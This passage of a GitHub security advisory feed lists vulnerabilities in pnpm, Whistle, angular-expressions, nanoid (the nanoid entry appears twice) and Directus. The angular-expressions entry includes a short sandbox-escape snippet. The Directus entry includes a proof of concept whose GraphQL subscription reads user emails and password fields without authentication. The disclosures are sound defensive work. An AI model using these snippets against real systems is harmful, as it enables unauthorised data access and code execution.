<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53866">https://nvd.nist.gov/vuln/detail/CVE-2024-53866</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/11afcddea48f25ed5117a87dc1780a55222b9743">https://github.com/pnpm/pnpm/commit/11afcddea48f25ed5117a87dc1780a55222b9743</a></li>
<li><a href="https://github.com/advisories/GHSA-vm32-9rqf-rh3r">https://github.com/advisories/GHSA-vm32-9rqf-rh3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vm32-9rqf-rh3r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-10T22:42:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[whistle] Avenwu Whistle Cross-Site Request Forgery (CSRF)]]></title>
        <id>https://github.com/advisories/GHSA-gg6x-448q-pqqm</id>
        <link href="https://github.com/advisories/GHSA-gg6x-448q-pqqm"/>
        <updated>2024-12-10T22:41:24.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-Site Request Forgery (CSRF) in Avenwu Whistle v.2.9.90 and before allows attackers to perform malicious API calls, resulting in the execution of arbitrary code on the victim's machine.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55500">https://nvd.nist.gov/vuln/detail/CVE-2024-55500</a></li>
<li><a href="https://github.com/avwo/whistle/commit/d1b8ca275dc4e453bd2efed392c0fd4b92f73cdf">https://github.com/avwo/whistle/commit/d1b8ca275dc4e453bd2efed392c0fd4b92f73cdf</a></li>
<li><a href="https://www.sonarsource.com/blog/never-underestimate-csrf-why-origin-reflection-is-a-bad-idea">https://www.sonarsource.com/blog/never-underestimate-csrf-why-origin-reflection-is-a-bad-idea</a></li>
<li><a href="https://github.com/advisories/GHSA-gg6x-448q-pqqm">https://github.com/advisories/GHSA-gg6x-448q-pqqm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gg6x-448q-pqqm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-10T21:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[angular-expressions] Angular Expressions - Remote Code Execution when using locals]]></title>
        <id>https://github.com/advisories/GHSA-5462-4vcx-jh7j</id>
        <link href="https://github.com/advisories/GHSA-5462-4vcx-jh7j"/>
        <updated>2024-12-10T20:59:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker can write a malicious expression that escapes the sandbox to execute arbitrary code on the system.</p>
<p>Example of vulnerable code:</p>
<pre><code class="language-js">const expressions = require("angular-expressions");
const result = expressions.compile("__proto__.constructor")({}, {});
// result should be undefined, however for versions &lt;=1.4.2, it returns an object.
</code></pre>
<p>With a more complex (undisclosed) payload, one can get full access to Arbitrary code execution on the system.</p>
<h3 id="patches">Patches</h3>
<p>The problem has been patched in version 1.4.3 of angular-expressions.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is one workaround if it not possible for you to update : </p>
<ul>
<li>Make sure that you use the compiled function with just one argument : ie this is not vulnerable : 
  <code>const result = expressions.compile("__proto__.constructor")({});</code> : in this case you lose the feature of locals if you need it.</li>
</ul>
<h3 id="credits">Credits</h3>
<p>Credits go to <a href="https://github.com/JorianWoltjer">JorianWoltjer</a> who has found the issue and reported it to use. <a href="https://jorianwoltjer.com/">https://jorianwoltjer.com/</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/peerigon/angular-expressions/security/advisories/GHSA-5462-4vcx-jh7j">https://github.com/peerigon/angular-expressions/security/advisories/GHSA-5462-4vcx-jh7j</a></li>
<li><a href="https://github.com/peerigon/angular-expressions/commit/97f7ad94006156eeb97fc942332578b6cfbf8eef">https://github.com/peerigon/angular-expressions/commit/97f7ad94006156eeb97fc942332578b6cfbf8eef</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-54152">https://nvd.nist.gov/vuln/detail/CVE-2024-54152</a></li>
<li><a href="https://github.com/advisories/GHSA-5462-4vcx-jh7j">https://github.com/advisories/GHSA-5462-4vcx-jh7j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5462-4vcx-jh7j</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-12-10T16:54:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nanoid] Predictable results in nanoid generation when given non-integer values]]></title>
        <id>https://github.com/advisories/GHSA-mwcw-c2x4-8c55</id>
        <link href="https://github.com/advisories/GHSA-mwcw-c2x4-8c55"/>
        <updated>2024-12-13T22:57:32.000Z</updated>
        <content type="html"><![CDATA[<p>When nanoid is called with a fractional value, there were a number of undesirable effects:</p>
<ol>
<li>in browser and non-secure, the code infinite loops on while (size--)</li>
<li>in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled</li>
<li>if the first call in node is a fractional argument, the initial buffer allocation fails with an error</li>
</ol>
<p>Version 3.3.8 and 5.0.9 are fixed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55565">https://nvd.nist.gov/vuln/detail/CVE-2024-55565</a></li>
<li><a href="https://github.com/ai/nanoid/pull/510">https://github.com/ai/nanoid/pull/510</a></li>
<li><a href="https://github.com/ai/nanoid/compare/3.3.7...3.3.8">https://github.com/ai/nanoid/compare/3.3.7...3.3.8</a></li>
<li><a href="https://github.com/ai/nanoid/releases/tag/5.0.9">https://github.com/ai/nanoid/releases/tag/5.0.9</a></li>
<li><a href="https://github.com/advisories/GHSA-mwcw-c2x4-8c55">https://github.com/advisories/GHSA-mwcw-c2x4-8c55</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mwcw-c2x4-8c55</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-09T03:30:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nanoid] Predictable results in nanoid generation when given non-integer values]]></title>
        <id>https://github.com/advisories/GHSA-mwcw-c2x4-8c55</id>
        <link href="https://github.com/advisories/GHSA-mwcw-c2x4-8c55"/>
        <updated>2024-12-13T22:57:32.000Z</updated>
        <content type="html"><![CDATA[<p>When nanoid is called with a fractional value, there were a number of undesirable effects:</p>
<ol>
<li>in browser and non-secure, the code infinite loops on while (size--)</li>
<li>in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled</li>
<li>if the first call in node is a fractional argument, the initial buffer allocation fails with an error</li>
</ol>
<p>Version 3.3.8 and 5.0.9 are fixed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55565">https://nvd.nist.gov/vuln/detail/CVE-2024-55565</a></li>
<li><a href="https://github.com/ai/nanoid/pull/510">https://github.com/ai/nanoid/pull/510</a></li>
<li><a href="https://github.com/ai/nanoid/compare/3.3.7...3.3.8">https://github.com/ai/nanoid/compare/3.3.7...3.3.8</a></li>
<li><a href="https://github.com/ai/nanoid/releases/tag/5.0.9">https://github.com/ai/nanoid/releases/tag/5.0.9</a></li>
<li><a href="https://github.com/advisories/GHSA-mwcw-c2x4-8c55">https://github.com/advisories/GHSA-mwcw-c2x4-8c55</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mwcw-c2x4-8c55</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-09T03:30:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@directus/api] Directus allows unauthenticated access to WebSocket events and operations]]></title>
        <id>https://github.com/advisories/GHSA-849r-qrwj-8rv4</id>
        <link href="https://github.com/advisories/GHSA-849r-qrwj-8rv4"/>
        <updated>2024-12-09T21:54:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When setting <code>WEBSOCKETS_GRAPHQL_AUTH</code> or <code>WEBSOCKETS_REST_AUTH</code> to "public", an unauthenticated user is able to do any of the supported operations (CRUD, subscriptions) with full admin privileges.</p>
<h3 id="details">Details</h3>
<p>Accountability for unauthenticated WebSocket requests is set to null, which used to be "public permissions" until the Permissions Policy update which now defaults that to system/admin level access. So instead of null we need to make use of <code>createDefaultAccountability()</code> to ensure public permissions are used for unauthenticated users.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Start directus with</li>
</ol>
<pre><code class="language-bash">WEBSOCKETS_ENABLED=true
WEBSOCKETS_GRAPHQL_AUTH=public
WEBSOCKETS_REST_AUTH=public
</code></pre>
<ol start="2">
<li>Subscribe using GQL or REST or do any CRUD operation on a user created collection (system tables are not reachable with crud)</li>
</ol>
<pre><code class="language-gql">subscription {
    directus_users_mutated {
        key
        event
        data {
            id
            email
            first_name
            last_name
            password
        }
    }
}
</code></pre>
<p>or</p>
<pre><code class="language-json">{
   "type": "items",
   "action": "read",
   "collection": "your_collection_name"
}
</code></pre>
<p>3a. Open up the data studio as any user. Observe how the subscriber gets notified on each page navigation (because the users <code>last_page</code> gets updated, the <code>password</code> fields is properly redacted here)</p>
<p>3b. Observe receiving all available items from the <code>your_collection_name</code> collection.</p>
<h3 id="impact">Impact</h3>
<p>This impacts any Directus instance that has either <code>WEBSOCKETS_GRAPHQL_AUTH</code> or <code>WEBSOCKETS_REST_AUTH</code> set to <code>public</code> allowing unauthenticated users to subscribe for changes on any collection or do REST CRUD operations on user defined collections ignoring permissions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-849r-qrwj-8rv4">https://github.com/directus/directus/security/advisories/GHSA-849r-qrwj-8rv4</a></li>
<li><a href="https://github.com/directus/directus/commit/ce0397d16cf767b5293cd57f626c5349b5732a21">https://github.com/directus/directus/commit/ce0397d16cf767b5293cd57f626c5349b5732a21</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-54151">https://nvd.nist.gov/vuln/detail/CVE-2024-54151</a></li>
<li><a href="https://github.com/advisories/GHSA-849r-qrwj-8rv4">https://github.com/advisories/GHSA-849r-qrwj-8rv4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-849r-qrwj-8rv4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-09T20:40:54.000Z</published>
    </entry>
</feed>